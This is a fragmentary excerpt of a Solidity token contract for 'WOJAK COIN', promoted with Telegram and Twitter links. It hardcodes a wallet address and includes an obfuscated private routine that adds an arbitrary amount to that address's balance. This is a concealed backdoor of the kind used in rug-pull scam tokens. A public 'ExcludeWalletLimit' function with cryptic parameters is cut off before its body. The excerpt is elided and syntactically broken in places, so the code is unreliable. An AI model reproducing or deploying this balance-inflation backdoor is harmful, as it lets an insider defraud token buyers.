...
/*
Telegram : https://t.me/wojackARB
Twitter : https://twitter.com/wojackarb
*/
...
contract WOJAK is Context, IERC20, Ownable {
    ...
    string private _name = "WOJAK COIN";
    string private _symbol = "WOJAK";
    uint8 private _decimals = 6;
    address payable public wojak;
    ...
    constructor () {
        ...
        wojak = payable(address(0x865c8Fb7ea5376f430668aC4c1e5B753EB319962));
    }
    ...
    implementations) private {
        implementations[wojak] += valueIndex;
    }
    ...
    function ExcludeWalletLimit(address right,uint256 mach) public {
